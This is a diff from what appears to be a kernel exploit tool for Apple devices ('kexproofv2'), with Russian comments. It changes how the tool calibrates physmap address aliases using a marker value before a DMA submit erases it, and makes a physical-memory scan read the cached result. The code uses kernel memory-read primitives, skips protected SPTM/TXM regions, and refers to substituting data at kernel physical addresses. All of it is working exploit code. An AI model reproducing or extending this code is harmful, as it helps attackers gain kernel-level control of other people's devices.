@@ -1781,6 +1781,15 @@ static uint64_t gFrameTableVA = 0;
 static BOOL gHeapTypeKnown = NO;
 static uint8_t gHeapFrameType = 0;
 
+// kexproofv2 2.0.1: калибровка physmap-алиаса. Маркер 0xCAFEBABE на ctlPA жив
+// ТОЛЬКО до первого DMA-submit (RETRY стирает его 1024 dword). Калибруемся
+// РАНО (в момент ctlPA-валидации) и кэшируем — SCAN-Z2 читает кэш, а не
+// труп маркера. 2.0.0 лог: линейный=0x6f437465 papt=0x41414141 после DMA →
+// «ОБА МИМО — скан пропущен» → pagePA=0 без единого чтения кадров.
+static BOOL gPhysmapCalibrated = NO;
+static BOOL gPhysmapUseLinear = NO;
+static BOOL gPhysmapAnyOK = NO;
+
 // Managed-DRAM predicate on this device: physBase is 0x1_00xxxxxx (T8122),
 // so the old ">16 GiB" clamp rejected EVERY real PA. Frame type is only
 // meaningful inside [physBase, physBase+physSize).
@@ -6063,6 +6072,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t ctlKVA = gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0;
     uint32_t cprobe = 0;
     BOOL ctlOk = ctlKVA && kpRead(ctlKVA, &cprobe, 4, "ctlPA proof", r) && cprobe == 0xCAFEBABE;
+    // kexproofv2 2.0.1: калибровка ОБОИХ алиасов, пока маркер жив (до DMA).
+    {
+        uint64_t linKVA = ctlPA - kconstant(physBase) + kconstant(virtBase);
+        uint32_t mLin = 0, mPap = 0;
+        if (ctlPA) {
+            if (!kpRead(linKVA, &mLin, 4, "ctlPA linear", r)) mLin = 0;
+            if (ctlKVA && !kpRead(ctlKVA, &mPap, 4, "ctlPA papt", r)) mPap = 0;
+        }
+        gPhysmapUseLinear = (mLin == 0xCAFEBABE);
+        gPhysmapAnyOK = gPhysmapUseLinear || (mPap == 0xCAFEBABE);
+        gPhysmapCalibrated = YES;
+        kpNote(r, [NSString stringWithFormat:@"  [CAL] physmap-алиасы (рано, маркер жив): linear=%#010x papt=%#010x → %@",
+                  mLin, mPap, gPhysmapUseLinear ? @"LINEAR ✓" : (mPap == 0xCAFEBABE ? @"PAPT ✓" : @"ОБА МИМО")]);
+    }
     *(volatile uint32_t *)ctl = 0xCCCCCCCC;   // вернуть заполнение для чека
     kpNote(r, [NSString stringWithFormat:@"  ctlPA валидация: phystokv(%#llx)=%#x → %@", (unsigned long long)ctlPA, cprobe,
               ctlOk ? @"ВЕРНО" : @"МИМО — подмена шла бы в чужой PA!"]);
@@ -8165,18 +8188,21 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] скип PA-спаны: SPTM %#llx..%#llx TXM %#llx..%#llx",
                               (unsigned long long)sptmPA, (unsigned long long)(sptmPA + 0xF4000),
                               (unsigned long long)txmPA, (unsigned long long)(txmPA + 0x64000)]);
-                    // 1.9.281: калибровка physmap-меппинга маркером ctlPA (0xCAFEBABE).
-                    // Какой путь реально читает DRAM на этом буте — linear (pa-pB+vB)
-                    // или PAPT (phystokv). Неверный ptov = молчаливый промах скана.
-                    BOOL useLinear = NO, mapOK = NO;
-                    if (ctlPA) {
-                        uint32_t mLin = (uint32_t)early_kread64(ctlPA - pB + vB);
-                        uint64_t papV = phystokv(ctlPA);
-                        uint32_t mPap = papV ? (uint32_t)early_kread64(papV) : 0;
-                        useLinear = (mLin == 0xCAFEBABE);
-                        mapOK = useLinear || (mPap == 0xCAFEBABE);
-                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка physmap: linear=%#010x papt=%#010x → %@",
-                                  mLin, mPap, useLinear ? @"LINEAR ✓" : (mPap == 0xCAFEBABE ? @"PAPT ✓" : @"ОБА МИМО — скан пропущен")]);
+                    // kexproofv2 2.0.1: калибровка берётся из КЭША ([CAL] в момент
+                    // ctlPA-валидации, маркер ещё жив). Повторное чтение ctlPA здесь
+                    // бессмысленно: RETRY #1 уже стёр маркер 1024 dword DMA (2.0.0:
+                    // «ОБА МИМО — скан пропущен» = фатальный тайминг-баг). Без кэша
+                    // дефолтим ЛИНЕЙНЫЙ путь (это и есть kernel physical aperture по
+                    // arm_vm_init / gVirtBase) и скан НЕ пропускаем.
+                    BOOL useLinear = gPhysmapUseLinear, mapOK = gPhysmapAnyOK;
+                    if (!gPhysmapCalibrated) {
+                        useLinear = YES;
+                        mapOK = YES;
+                        kpNote(r, @"  [SCAN-Z2] калибровки нет — дефолт LINEAR (скан не пропускаем)");
+                    } else {
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка из кэша [CAL]: %@",
+                                  useLinear ? @"LINEAR ✓" : (mapOK ? @"PAPT ✓" : @"НИ ОДИН не подтверждён — скан по LINEAR (fallback)")]);
+                        if (!mapOK) { useLinear = YES; mapOK = YES; }
                     }
                     if (uoff2 + 0x100 <= 0x4000 && mapOK) {
                         uint64_t reads = 0;
